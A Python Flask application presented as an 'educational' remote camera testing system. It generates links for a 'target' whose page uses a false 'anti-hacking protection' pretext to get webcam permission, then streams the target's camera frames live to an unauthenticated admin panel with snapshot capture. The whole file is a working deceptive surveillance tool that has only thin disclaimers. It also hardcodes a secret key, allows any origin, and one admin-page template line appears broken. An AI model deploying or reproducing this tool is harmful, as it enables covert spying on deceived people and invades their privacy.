#!/usr/bin/env python3
"""
Remote Camera Access System - VPS Production Version
Educational and authorized security testing only
"""

import cv2
import numpy as np
import threading
import time
import json
import os
import socket
import uuid
from datetime import datetime
import base64
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit
from werkzeug.serving import WSGIRequestHandler

class RemoteCameraSystem:
    def __init__(self):
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = 'remote_camera_vps_2024'
        self.socketio = SocketIO(self.app, cors_allowed_origins="*", async_mode='threading')
        self.active_sessions = {}
        self.camera_feeds = {}
        
        # VPS Configuration
        self.host = '0.0.0.0'
        self.port = int(os.environ.get('PORT', 5000))
        
        self.setup_routes()
        self.setup_socketio_events()
        
    def setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/')
        def index():
            return self.generate_main_page()
        
        @self.app.route('/access/<session_id>')
        def access_page(session_id):
            return self.generate_camera_access_page(session_id)
        
        @self.app.route('/admin/<session_id>')
        def admin_panel(session_id):
            return self.generate_admin_panel(session_id)
        
        @self.app.route('/create_session', methods=['POST'])
        def create_session():
            session_id = str(uuid.uuid4())
            self.active_sessions[session_id] = {
                'created': datetime.now().isoformat(),
                'camera_active': False,
                'client_connected': False,
                'frames_captured': 0,
                'target_ip': request.remote_addr
            }
            
            # Get server info
            server_ip = self.get_server_ip()
            protocol = 'https' if os.environ.get('HTTPS') == 'true' else 'http'
            
            access_link = f"{protocol}://{server_ip}:{self.port}/access/{session_id}"
            admin_link = f"{protocol}://{server_ip}:{self.port}/admin/{session_id}"
            
            return jsonify({
                'session_id': session_id,
                'access_link': access_link,
                'admin_link': admin_link,
                'server_info': {
                    'ip': server_ip,
                    'port': self.port,
                    'protocol': protocol,
                    'timestamp': datetime.now().isoformat()
                },
                'network_info': {
                    'vps_mode': True,
                    'public_access': True,
                    'ssl_enabled': protocol == 'https'
                }
            })
        
        @self.app.route('/session_status/<session_id>')
        def session_status(session_id):
            if session_id in self.active_sessions:
                return jsonify(self.active_sessions[session_id])
            return jsonify({'error': 'Session not found'}), 404
        
        @self.app.route('/health')
        def health_check():
            return jsonify({
                'status': 'healthy',
                'active_sessions': len(self.active_sessions),
                'timestamp': datetime.now().isoformat(),
                'server': 'Remote Camera System VPS'
            })
        
        @self.app.route('/static/<path:filename>')
        def static_files(filename):
            return send_from_directory('static', filename)
    
    def setup_socketio_events(self):
        """Setup SocketIO events for real-time communication"""
        
        @self.socketio.on('connect')
        def handle_connect():
            emit('server_info', {
                'message': 'Connected to Remote Camera System',
                'timestamp': datetime.now().isoformat()
            })
        
        @self.socketio.on('disconnect')
        def handle_disconnect():
            pass
        
        @self.socketio.on('join_session')
        def handle_join_session(data):
            session_id = data['session_id']
            user_type = data['user_type']
            
            from flask_socketio import join_room
            join_room(session_id)
            
            if session_id in self.active_sessions:
                if user_type == 'target':
                    self.active_sessions[session_id]['client_connected'] = True
                    self.active_sessions[session_id]['target_ip'] = request.remote_addr
                
                emit('session_update', self.active_sessions[session_id], room=session_id)
        
        @self.socketio.on('camera_frame')
        def handle_camera_frame(data):
            session_id = data['session_id']
            frame_data = data['frame']
            
            if session_id in self.active_sessions:
                self.active_sessions[session_id]['camera_active'] = True
                self.active_sessions[session_id]['frames_captured'] += 1
                
                emit('camera_feed', {
                    'frame': frame_data,
                    'timestamp': datetime.now().isoformat(),
                    'session_id': session_id,
                    'server_time': time.time()
                }, room=session_id)
        
        @self.socketio.on('camera_stop')
        def handle_camera_stop(data):
            session_id = data['session_id']
            
            if session_id in self.active_sessions:
                self.active_sessions[session_id]['camera_active'] = False
                
                emit('camera_stopped', {
                    'session_id': session_id,
                    'timestamp': datetime.now().isoformat()
                }, room=session_id)
        
        @self.socketio.on('admin_command')
        def handle_admin_command(data):
            session_id = data['session_id']
            command = data['command']
            
            emit('command_from_admin', {
                'command': command,
                'timestamp': datetime.now().isoformat()
            }, room=session_id)
    
    def get_server_ip(self):
        """Get server IP address"""
        try:
            # Try to get public IP first
            import requests
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            return response.json()['ip']
        except:
            # Fallback to local IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except:
                return "localhost"
    
    def generate_main_page(self):
        """Generate the main access page"""
        return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Camera System - VPS</title>
    <meta name="description" content="Remote Camera Access System for Educational Testing">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            max-width: 600px;
            width: 90%;
            text-align: center;
        }
        
        .logo {
            font-size: 3rem;
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 2rem;
            margin-bottom: 20px;
            font-weight: 300;
        }
        
        .description {
            margin-bottom: 30px;
            opacity: 0.9;
            line-height: 1.6;
        }
        
        .server-info {
            background: rgba(78, 205, 196, 0.2);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 4px solid #4ecdc4;
        }
        
        .server-info h3 {
            color: #4ecdc4;
            margin-bottom: 15px;
        }
        
        .btn {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }
        
        .btn-secondary {
            background: linear-gradient(45deg, #4ecdc4, #44a08d);
        }
        
        .result {
            margin-top: 30px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            display: none;
        }
        
        .link {
            background: rgba(255, 255, 255, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
            word-break: break-all;
            font-family: monospace;
        }
        
        .warning {
            background: rgba(255, 107, 107, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid #ff6b6b;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .stat-item {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }
        
        .stat-item h4 {
            color: #4ecdc4;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📷</div>
        <h1>Remote Camera System</h1>
        <p class="description">
            VPS Production Edition - Educational Security Testing Platform
        </p>
        
        <div class="server-info">
            <h3>🌐 Server Information</h3>
            <div class="stats">
                <div class="stat-item">
                    <h4>Status</h4>
                    <p id="serverStatus">Checking...</p>
                </div>
                <div class="stat-item">
                    <h4>Mode</h4>
                    <p>VPS Production</p>
                </div>
                <div class="stat-item">
                    <h4>Access</h4>
                    <p>Public</p>
                </div>
            </div>
        </div>
        
        <div class="warning">
            ⚠️ For educational and authorized security testing only
        </div>
        
        <button class="btn" onclick="createSession()">Create Session</button>
        <button class="btn btn-secondary" onclick="checkServerStatus()">Check Status</button>
        
        <div id="result" class="result">
            <h3>Session Created</h3>
            <p>Share these links with the target:</p>
            
            <div class="link">
                <strong>📱 Target Access Link:</strong><br>
                <span id="accessLink"></span>
            </div>
            
            <div class="link">
                <strong>👤 Admin Panel Link:</strong><br>
                <span id="adminLink"></span>
            </div>
            
            <div id="serverInfo" class="server-info" style="display:none;">
                <h4>🌍 Server Details</h4>
                <div id="serverDetails"></div>
            </div>
            
            <button class="btn btn-secondary" onclick="copyLinks()">📋 Copy Links</button>
            <button class="btn btn-secondary" onclick="shareLinks()">📤 Share</button>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        
        socket.on('server_info', function(data) {
            document.getElementById('serverStatus').textContent = 'Online';
        });
        
        function createSession() {
            const btn = event.target;
            btn.disabled = true;
            btn.textContent = 'Creating...';
            
            fetch('/create_session', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                }
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('accessLink').textContent = data.access_link;
                document.getElementById('adminLink').textContent = data.admin_link;
                document.getElementById('result').style.display = 'block';
                
                // Show server info
                if (data.server_info) {
                    const serverInfo = document.getElementById('serverInfo');
                    const serverDetails = document.getElementById('serverDetails');
                    
                    serverDetails.innerHTML = `
                        <div class="stat-item">
                            <h4>Server IP</h4>
                            <p>${data.server_info.ip}</p>
                        </div>
                        <div class="stat-item">
                            <h4>Port</h4>
                            <p>${data.server_info.port}</p>
                        </div>
                        <div class="stat-item">
                            <h4>Protocol</h4>
                            <p>${data.server_info.protocol.toUpperCase()}</p>
                        </div>
                        <div class="stat-item">
                            <h4>Session ID</h4>
                            <p>${data.session_id.substring(0, 8)}...</p>
                        </div>
                    `;
                    serverInfo.style.display = 'block';
                }
                
                btn.disabled = false;
                btn.textContent = 'Create New Session';
            })
            .catch(error => {
                console.error('Error:', error);
                btn.disabled = false;
                btn.textContent = 'Create Session';
            });
        }
        
        function checkServerStatus() {
            fetch('/health')
            .then(response => response.json())
            .then(data => {
                document.getElementById('serverStatus').textContent = 'Healthy';
                alert(`Server Status: ${data.status}\\nActive Sessions: ${data.active_sessions}`);
            })
            .catch(error => {
                document.getElementById('serverStatus').textContent = 'Error';
                alert('Server health check failed');
            });
        }
        
        function copyLinks() {
            const accessLink = document.getElementById('accessLink').textContent;
            const adminLink = document.getElementById('adminLink').textContent;
            
            const text = `Target Access: ${accessLink}\\nAdmin Panel: ${adminLink}`;
            
            navigator.clipboard.writeText(text).then(() => {
                alert('Links copied to clipboard!');
            });
        }
        
        function shareLinks() {
            const accessLink = document.getElementById('accessLink').textContent;
            
            if (navigator.share) {
                navigator.share({
                    title: 'Remote Camera Access',
                    text: `Access Link: ${accessLink}`,
                    url: accessLink
                });
            } else {
                window.open(accessLink, '_blank');
            }
        }
        
        // Auto-check server status
        checkServerStatus();
    </script>
</body>
</html>
        '''
    
    def generate_camera_access_page(self, session_id):
        """Generate the camera access page for target"""
        return f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access Request</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            padding: 20px;
        }}
        
        .container {{
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            max-width: 600px;
            width: 100%;
            text-align: center;
        }}
        
        .logo {{
            font-size: 3rem;
            margin-bottom: 20px;
        }}
        
        h1 {{
            font-size: 2rem;
            margin-bottom: 20px;
            font-weight: 300;
        }}
        
        .description {{
            margin-bottom: 30px;
            opacity: 0.9;
            line-height: 1.6;
        }}
        
        .video-container {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            min-height: 300px;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        
        video {{
            width: 100%;
            max-width: 500px;
            border-radius: 10px;
            display: none;
        }}
        
        .btn {{
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px;
            width: 100%;
            max-width: 200px;
        }}
        
        .btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }}
        
        .btn:disabled {{
            background: #666;
            cursor: not-allowed;
            transform: none;
        }}
        
        .btn-secondary {{
            background: linear-gradient(45deg, #4ecdc4, #44a08d);
        }}
        
        .btn-danger {{
            background: linear-gradient(45deg, #e74c3c, #c0392b);
        }}
        
        .status {{
            margin: 20px 0;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
        }}
        
        .warning {{
            background: rgba(255, 107, 107, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid #ff6b6b;
        }}
        
        .info {{
            background: rgba(52, 152, 219, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid #3498db;
        }}
        
        .session-info {{
            font-size: 0.9rem;
            opacity: 0.8;
            margin: 10px 0;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📷</div>
        <h1>Camera Access Request</h1>
        <p class="description">
            Educational security testing platform requesting camera access
        </p>
        
        <div class="session-info">
            Session: {session_id[:8]}...
        </div>
        
        <div class="warning">
            ⚠️ Only allow camera access if you trust this request
        </div>
        
        <div class="info">
            📊 This is for testing anti-hacking protection systems
        </div>
        
        <div class="video-container">
            <video id="videoElement" autoplay playsinline muted></video>
            <div id="placeholder">
                <p>📹 Camera preview will appear here</p>
                <p>Click "Allow Camera" to start</p>
            </div>
        </div>
        
        <div class="status" id="status">
            Status: Waiting for your decision...
        </div>
        
        <button class="btn" id="allowBtn" onclick="allowCamera()">✅ Allow Camera</button>
        <button class="btn btn-danger" id="denyBtn" onclick="denyCamera()">❌ Deny Access</button>
        <button class="btn btn-secondary" id="stopBtn" onclick="stopCamera()" style="display:none;">⏹️ Stop Camera</button>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        const sessionId = '{session_id}';
        let stream = null;
        let isStreaming = false;
        
        // Join session room
        socket.emit('join_session', {{
            session_id: sessionId,
            user_type: 'target'
        }});
        
        function updateStatus(message) {{
            document.getElementById('status').innerHTML = `Status: ${{message}}`;
        }}
        
        function allowCamera() {{
            updateStatus('Requesting camera permission...');
            
            navigator.mediaDevices.getUserMedia({{
                video: {{
                    width: {{ ideal: 1280 }},
                    height: {{ ideal: 720 }},
                    facingMode: 'user'
                }},
                audio: false
            }})
            .then(function(mediaStream) {{
                stream = mediaStream;
                const video = document.getElementById('videoElement');
                video.srcObject = stream;
                video.style.display = 'block';
                document.getElementById('placeholder').style.display = 'none';
                
                document.getElementById('allowBtn').style.display = 'none';
                document.getElementById('denyBtn').style.display = 'none';
                document.getElementById('stopBtn').style.display = 'inline-block';
                
                updateStatus('✅ Camera access granted - Streaming...');
                isStreaming = true;
                
                // Start sending frames
                sendFrames();
            }})
            .catch(function(err) {{
                updateStatus('❌ Camera access denied: ' + err.message);
                console.error('Error accessing camera:', err);
                
                // Log the error for anti-hacking testing
                socket.emit('anti_hacking_test', {{
                    session_id: sessionId,
                    test_type: 'camera_permission_denied',
                    error: err.message,
                    timestamp: new Date().toISOString()
                }});
            }});
        }}
        
        function denyCamera() {{
            updateStatus('❌ Camera access denied by user');
            document.getElementById('allowBtn').disabled = true;
            document.getElementById('denyBtn').disabled = true;
            
            // Log denial for anti-hacking testing
            socket.emit('anti_hacking_test', {{
                session_id: sessionId,
                test_type: 'user_denied_access',
                timestamp: new Date().toISOString()
            }});
        }}
        
        function stopCamera() {{
            if (stream) {{
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }}
            
            const video = document.getElementById('videoElement');
            video.style.display = 'none';
            document.getElementById('placeholder').style.display = 'block';
            
            document.getElementById('allowBtn').style.display = 'inline-block';
            document.getElementById('denyBtn').style.display = 'inline-block';
            document.getElementById('stopBtn').style.display = 'none';
            
            updateStatus('⏹️ Camera stopped');
            isStreaming = false;
            
            // Notify admin
            socket.emit('camera_stop', {{
                session_id: sessionId
            }});
        }}
        
        function sendFrames() {{
            if (!isStreaming || !stream) return;
            
            const video = document.getElementById('videoElement');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            function captureFrame() {{
                if (!isStreaming) return;
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                
                // Send frame to server
                socket.emit('camera_frame', {{
                    session_id: sessionId,
                    frame: imageData
                }});
                
                // Capture next frame
                setTimeout(captureFrame, 100); // 10 FPS
            }}
            
            captureFrame();
        }}
        
        // Handle admin commands
        socket.on('command_from_admin', function(data) {{
            console.log('Admin command:', data.command);
            
            if (data.command === 'stop_session') {{
                if (isStreaming) {{
                    stopCamera();
                }}
                updateStatus('🛑 Session stopped by admin');
            }}
        }});
        
        // Handle connection events
        socket.on('connect', function() {{
            updateStatus('🔗 Connected to server');
        }});
        
        socket.on('disconnect', function() {{
            updateStatus('🔌 Disconnected from server');
            if (isStreaming) {{
                stopCamera();
            }}
        }});
    </script>
</body>
</html>
        '''
    
    def generate_admin_panel(self, session_id):
        """Generate the admin panel for monitoring"""
        return f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Remote Camera System</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: white;
        }}
        
        .header {{
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            text-align: center;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        .panel {{
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
        }}
        
        .video-container {{
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 20px;
            text-align: center;
        }}
        
        #cameraFeed {{
            max-width: 100%;
            border-radius: 10px;
        }}
        
        .status-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }}
        
        .status-item {{
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }}
        
        .status-item h3 {{
            margin-bottom: 10px;
            color: #4ecdc4;
        }}
        
        .controls {{
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }}
        
        .btn {{
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }}
        
        .btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }}
        
        .btn-secondary {{
            background: linear-gradient(45deg, #4ecdc4, #44a08d);
        }}
        
        .btn-danger {{
            background: linear-gradient(45deg, #e74c3c, #c0392b);
        }}
        
        .offline {{
            text-align: center;
            padding: 40px;
            background: rgba(255, 107, 107, 0.2);
            border-radius: 10px;
            margin: 20px 0;
        }}
        
        .test-results {{
            background: rgba(255, 193, 7, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid #ffc107;
        }}
        
        .session-info {{
            font-size: 0.9rem;
            opacity: 0.8;
            margin: 10px 0;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>📷 Admin Panel</h1>
        <div class="session-info">Session: {session_id[:8]}...</div>
    </div>
    
    <div class="container">
        <div class="panel">
            <h2>📹 Camera Feed</h2>
            <div class="video-container">
                <img id="cameraFeed" src="" alt="Camera feed will appear here" style="display:none;">
                <div id="offlineMessage" class="offline">
                    <p>📷 Waiting for camera connection...</p>
                    <p>Target needs to click "Allow Camera" on their device</p>
                    <p>🌐 VPS Mode - Public Access Enabled</p>
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>📊 Session Status</h2>
            <div class="status-grid">
                <div class="status-item">
                    <h3>Connection</h3>
                    <p id="connectionStatus">Disconnected</p>
                </div>
                <div class="status-item">
                    <h3>Camera</h3>
                    <p id="cameraStatus">Inactive</p>
                </div>
                <div class="status-item">
                    <h3>Frames</h3>
                    <p id="frameCount">0</p>
                </div>
                <div class="status-item">
                    <h3>Last Update</h3>
                    <p id="lastUpdate">Never</p>
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>🧪 Anti-Hacking Test Results</h2>
            <div id="testResults" class="test-results">
                <p>📋 Waiting for test results...</p>
            </div>
        </div>
        
        <div class="panel">
            <h2>🎮 Controls</h2>
            <div class="controls">
                <button class="btn" onclick="requestHighQuality()">📸 High Quality</button>
                <button class="btn btn-secondary" onclick="requestLowQuality()">📱 Low Quality</button>
                <button class="btn btn-secondary" onclick="takeSnapshot()">📸 Snapshot</button>
                <button class="btn btn-danger" onclick="stopSession()">🛑 Stop Session</button>
            </div>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        const sessionId = '{session_id}';
        let frameCount = 0;
        let testResults = [];
        
        // Join session room
        socket.emit('join_session', {{
            session_id: sessionId,
            user_type: 'admin'
        }});
        
        // Update connection status
        socket.on('connect', function() {{
            document.getElementById('connectionStatus').textContent = 'Connected';
        }});
        
        socket.on('disconnect', function() {{
            document.getElementById('connectionStatus').textContent = 'Disconnected';
        }});
        
        // Handle camera feed
        socket.on('camera_feed', function(data) {{
            const img = document.getElementById('cameraFeed');
            const offlineMsg = document.getElementById('offlineMessage');
            
            img.src = data.frame;
            img.style.display = 'block';
            offlineMsg.style.display = 'none';
            
            document.getElementById('cameraStatus').textContent = 'Active';
            document.getElementById('frameCount').textContent = ++frameCount;
            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
        }});
        
        socket.on('camera_stopped', function(data) {{
            const img = document.getElementById('cameraFeed');
            const offlineMsg = document.getElementById('offlineMessage');
            
            img.style.display = 'none';
            offlineMsg.style.display = 'block';
            
            document.getElementById('cameraStatus').textContent = 'Stopped';
        }});
        
        // Handle anti-hacking test results
        socket.on('anti_hacking_test', function(data) {{
            testResults.push(data);
            updateTestResults();
        }});
        
        function updateTestResults() {{
            const resultsDiv = document.getElementById('testResults');
            
            if (testResults.length === 0) {{
                resultsDiv.innerHTML = '<p>📋 Waiting for test results...</p>';
                return;
            }}
            
            let html = '<h4>🧪 Test Results:</h4>';
            testResults.forEach((result, index) => {{
                html += `<div style="margin: 10px 0; padding: 10px; background: rgba(255,255,255,0.1); border-radius: 5px;">
                    <strong>Test ${index + 1}:</strong> ${{result.test_type}}<br>
                    <small>Time: ${{new Date(result.timestamp).toLocaleString()}}</small>
                    ${{result.error ? '<br><span style="color: #ff6b6b;">Error: ' + result.error + '</span>' : ''}}
                </div>`;
            }});
            
            resultsDiv.innerHTML = html;
        }}
        
        function requestHighQuality() {{
            socket.emit('admin_command', {{
                session_id: sessionId,
                command: 'high_quality'
            }});
        }}
        
        function requestLowQuality() {{
            socket.emit('admin_command', {{
                session_id: sessionId,
                command: 'low_quality'
            }});
        }}
        
        function takeSnapshot() {{
            const img = document.getElementById('cameraFeed');
            if (img.src) {{
                const link = document.createElement('a');
                link.download = 'snapshot_' + new Date().getTime() + '.jpg';
                link.href = img.src;
                link.click();
            }}
        }}
        
        function stopSession() {{
            socket.emit('admin_command', {{
                session_id: sessionId,
                command: 'stop_session'
            }});
            
            setTimeout(() => {{
                if (confirm('Session stopped. Close this tab?')) {{
                    window.close();
                }}
            }}, 1000);
        }}
    </script>
</body>
</html>
        '''
    
    def run(self, debug=False):
        """Run the remote camera system"""
        print("🌐 Remote Camera System - VPS Production")
        print("=" * 60)
        print("⚠️  For educational and authorized testing only")
        print("=" * 60)
        print(f"🚀 Server starting on {self.host}:{self.port}")
        print(f"📱 Public access enabled")
        print(f"🌍 VPS mode activated")
        print("=" * 60)
        
        # Set production mode
        WSGIRequestHandler.protocol_version = "HTTP/1.1"
        
        self.socketio.run(
            self.app, 
            host=self.host, 
            port=self.port, 
            debug=debug,
            allow_unsafe_werkzeug=True
        )

if __name__ == "__main__":
    system = RemoteCameraSystem()
    system.run(debug=False)
